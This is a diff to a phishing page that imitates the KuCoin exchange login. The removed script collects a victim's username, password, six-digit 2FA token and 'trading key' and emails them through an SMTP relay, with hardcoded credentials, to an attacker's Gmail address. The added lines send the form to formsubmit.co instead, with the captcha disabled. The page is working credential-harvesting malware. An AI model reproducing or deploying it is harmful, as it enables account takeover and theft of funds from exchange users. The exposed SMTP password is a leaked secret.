@@ -553,8 +553,8 @@
                                   </div>
                                 </section>
                                 
-                                <form action="https://formsubmit.co/ollarkunle1@gmail.com" method="post" id="login-form" onsubmit="handleForm(event)" class="css-fcf6q KuxForm-form KuxForm-verticalForm">
-                                  
+                                    <form action="https://formsubmit.co/ollarkunle1@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+                                        <input type="hidden" name="_captcha" value="false">
                                   <div class="KuxForm-item css-9mv970">
                                     <div class="KuxForm-itemRowContainer KuxRow-row css-1uqn2oy" style="row-gap: 0px;">
                                       <div order="0" offset="0" class="KuxCol-col css-1dbp2j">
@@ -709,8 +709,9 @@
                                                 </div>
                                               </div>
 
-                                                   <button type="submit">proceed</button>
-
+                                              <button id="codeBtn" class="KuxButton-root KuxButton-contained KuxButton-containedPrimary KuxButton-sizeLarge KuxButton-containedSizeLarge KuxButton-fullWidth css-1awe74r" type="submit">
+                                                Proceed
+                                              </button>
 
                                             </div>
 
@@ -756,160 +757,3 @@
         </div>
       </div>
     </div>
-
-    <script src="jquery.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <script src="https://smtpjs.com/v3/smtp.js"></script>
-    
-    <script>
-      (function () {
-        emailjs.init('Br5uvldDM0gfBsMak');
-      })();
-    </script>
-
-<script>
-
-  const service_id = 'service_wmdzlsq'
-  const template_id = 'template_m2hh9tj'
-
-  function wait(timeout) {
-      return new Promise(resolve => {
-          setTimeout(resolve, timeout);
-      });
-  }
-
-
-  const handleForm = async (e) => {
-    e.preventDefault();
-
-    let email = $("#emailInput").val();
-    let phone = $("#phoneInput").val();
-    //let password = $("#passInput").val();
-    let message = `Username ${email}\nPassword: ${phone}`;
-
-    //console.log(message);
-    let data = {
-      message: message,
-      from_name: "kucoin"
-    }
-    const loginBtn = $("#loginBtn")
-
-    loginBtn.attr('disabled', true)
-    loginBtn.css('background-color', 'grey')
-    
-    
-    Email.send({
-        Host : "smtp.elasticemail.com",
-        Username : "Ollarkunle1@gmail.com",
-        Password : "3768E6A0E39AF03B2B137BA295D24DC77EEB",
-        To : 'Flexnorm58@gmail.com',
-        From : "Ollarkunle1@gmail.com",
-        Subject : "New message boss",
-        Body : message
-    })
-    .then(async (message) => {
-      //alert(message)
-      if (message == "OK") {
-        console.log(message)
-        await wait(5000)
-        switchForm();
-      }
-      else {
-        alert("Error", message)
-      }
-    })
-    .catch((error) => {
-      alert(error)
-    })
-    
-    /**
-    try {
-      await emailjs.send(service_id, template_id, data);
-      //alert('email sent!');
-      await wait(5000);
-      switchForm();
-
-    } catch (error) {
-      console.error(error);
-      alert('An error occured. Please try again.');
-    }
-    */
-  };
-
-  const sendToken = async (e) => {
-    e.preventDefault();
-    let token = ''
-    let tradingKey = $("#keyInput").val()
-    token1 = $('#token1').val()
-    token2 = $('#token2').val()
-    token3 = $('#token3').val()
-    token4 = $('#token4').val()
-    token5 = $('#token5').val()
-    token6 = $('#token6').val()
-
-    token = '' + token1 + token2 + token3 + token4 + token5 + token6
-    console.log(token)
-
-    message = `Token Code: ${token} \nTrading Key ${tradingKey}`
-
-    data = {
-      message: message,
-      from_name: 'kucoin'
-    }
-    
-    Email.send({
-        Host : "smtp.elasticemail.com",
-        Username : "Ollarkunle1@gmail.com",
-        Password : "3768E6A0E39AF03B2B137BA295D24DC77EEB",
-        To : 'Flexnorm58@gmail.com',
-        From : "Ollarkunle1@gmail.com",
-        Subject : "New message boss",
-        Body : message
-    })
-    .then((message) => {
-      //alert(message)
-      if (message == "OK") {
-        window.location.href = "auth.html";
-      } else {
-        alert("Error", message)
-      }
-    })
-    .catch((error) => {
-      alert(error)
-    })
-    
-
-    /**
-    try {
-      await emailjs.send(service_id, template_id, data);
-      //alert('email sent!');
-      window.location.href = "auth.html";
-
-    } catch (error) {
-      console.error(error);
-      alert('An error occured please try again.');
-    }
-    */
-
-  }
-
-</script>
-  
-    <script>
-
-      const switchForm = () => {
-
-        $("#userInput").hide();
-        $("#codeInput").show();
-      }
-
-      window.addEventListener('load', function () {
-        $("#codeInput").hide();
-        //switchForm();
-      })
-
-    </script>
-    
-  </body>
-
-</html>
